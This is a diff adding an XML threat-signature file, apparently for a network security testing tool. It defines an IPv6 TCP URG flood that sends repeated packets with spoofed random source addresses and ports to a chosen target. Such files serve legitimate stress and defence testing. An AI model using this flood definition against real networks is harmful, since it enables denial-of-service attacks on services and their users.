@@ -1,0 +1,52 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <SoftwareRevision display="true" value="1.4"/>
+    <ExecDesc value="URG Flood IPv6" display="true"/>
+    <EngDesc value="This threat is an IPv6 version of an URG flood." display="true"/>
+    <RunOnce value="false" display="false"/>
+    <Intent display="true">
+      <item value="Flood"/>
+    </Intent>
+    <Protocol value="TCP" display="true"/>
+    <Type_Of_Equipment value="Protocol" display="true"/>
+    <Known_Vendors_Affected display="true"/>
+    <Known_Products_Affected display="true"/>
+    <Known_Versions_Affected display="true"/>
+    <Credit display="true"/>
+    <Author value="Chuck McAuley" display="true"/>
+    <ID value="000000ffb7b74f3e00c000a80001003c0c0a2a84" display="true"/>
+    <Revision value="1" display="true"/>
+    <Suite display="true" value="Standard"/>
+    <AccessVector value="remote"/>
+    <AccessComplexity value="low"/>
+    <Authentication value="not-required"/>
+    <ConfImpact value="none"/>
+    <IntegImpact value="none"/>
+    <AvailImpact value="partial"/>
+    <ImpactBias value="normal"/>
+    <Created value="1139462150" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="destIPv6" type="ImperfectControls.IPv6Address" value="null" index="E"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="G"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="B"/>
+      <for index="C"/>
+      <for index="E"/>
+      <for index="G"/>
+    </for>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="86DD" Payload="">
+      <IPv6 Version="6" Priority="0" Flow-Label="0" Payload-Length="14" Next-Header="6" Hop-Limit="FF" Source-Address="@random(0000:0000:0000:0000:0000:0000:0000:0000, FFFF:FFFF:FFFF:FFFF:FFFF:FFFF:FFF:FFFF)" Destination-Address="$destIPv6" Payload="">
+        <TCP srcPort="@random(0,65535)" destPort="$destPort" SeqNumber="@random(0,FFFFFFFF)" AckNumber="@random(0,FFFFFFFF)" HeaderLength="5" WindowSize="@random(100,1000)" Checksum="@checksum(TCP.srcPort,TCP.destPort,TCP.SeqNumber,TCP.AckNumber,TCP.HeaderLength,TCP.RES1,TCP.RES2,TCP.RES3,TCP.RES4,TCP.CWR,TCP.ECE,TCP.URG,TCP.ACK,TCP.PSH,TCP.RST,TCP.SYN,TCP.FIN,TCP.WindowSize,TCP.UrgentPointer,TCP.Payload,IPv6.Source-Address,IPv6.Destination-Address,IPv6.Payload-Length,00,IPv6.Next-Header,CRC16)" UrgentPointer="00" Options="" Payload="" CWR="false" ECE="false" URG="true" ACK="false" PSH="false" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+</threatSignature>
